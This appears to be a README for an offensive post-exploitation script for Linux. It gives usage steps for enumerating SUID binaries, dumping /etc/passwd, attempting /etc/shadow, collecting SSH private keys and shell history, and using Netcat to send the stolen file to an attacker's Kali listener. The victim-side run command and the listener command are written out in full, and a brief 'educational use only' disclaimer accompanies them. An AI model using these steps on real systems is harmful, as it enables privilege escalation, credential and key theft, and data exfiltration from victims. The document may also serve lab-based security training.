# Victimfilesdownload_shell
Post-Exploitation Enumeration & Exfiltration Script (Linux os) 

it is about performing post-exploitation tasks after gaining a shell on a Linux system
(it can dowload permissions and resources on the victim machine)

-->Features: Enumerates SUID privilege escalation
-->Finds world-writable files  Dumps /etc/passwd, attempts /etc/shadow  
-->Locates SSH private keys and .bash_history  
-->Supports Netcat-based file exfiltration to attacker machine  

-->Pls Use for Educational Use Only 
or
-->use with permissions system only

How to Use (in your lab):

🖥️ On the Victim Machine (after gaining shell):

chmod +x post_exploitation_enum_and_exfil.sh

./post_exploitation_enum_and_exfil.sh <your-kali-ip> <port>

This will:

Enumerate SUID files, world-writable files

Dump /etc/passwd, try /etc/shadow

Search for SSH keys and .bash_history

Use Netcat to send /etc/passwd back to your Kali

On Your Kali (Attacker) Machine:
Start listener to receive the file:

nc -lvp <port> > passwd_loot.txt

